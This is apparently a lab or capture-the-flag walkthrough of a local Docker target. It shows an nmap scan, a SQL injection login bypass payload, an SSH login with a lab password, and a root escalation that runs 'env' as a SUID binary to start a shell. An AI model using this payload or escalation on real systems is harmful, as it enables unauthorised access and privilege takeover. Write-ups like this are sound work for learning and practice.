## Port Analysis
``` bash
nmap 172.17.0.2
```

``` bash
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-28 17:31 EDT
Nmap scan report for 172.17.0.2
Host is up (0.0000070s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 02:42:AC:11:00:02 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.21 seconds
```

Opened:
- Port 22 (ssh): Connect to the system
- Port 80 (HTTP): Web page

## SQL Injection on Login
![[Pasted image 20250328223842.png]]

SQL injection always true:
``` SQL
' or 1=1 -- -
```

![[Pasted image 20250328224034.png]]

## SSH Intrusion

``` bash
ssh dylan@172.17.0.2
```
**Password**: KJSDFG789FGSDF78

## Find SUID files

``` bash
find / -perm -4000 2>/dev/null
```
- **`find /`** → Starts searching from the root (`/`) directory.
- **`-perm -4000`** → Looks for files with the **SUID (Set User ID) permission** set (`4000` in octal).
- **`2>/dev/null`** → Redirects **error messages** (typically "Permission denied" errors) to `/dev/null` to avoid clutter in the output.

![[Pasted image 20250328225102.png]]

Search **`env`** on GTFOBins with SUID permission: https://gtfobins.github.io/gtfobins/env/#suid

``` bash
/usr/bin/env /bin/sh -p
```
- **`/usr/bin/env`** → Runs a command in a modified environment (typically used to locate and execute binaries in the correct environment).
- **`/bin/sh`** → Starts a new shell session using `/bin/sh`.
- **`-p`** → Instructs the shell to **not drop privileges** when executing.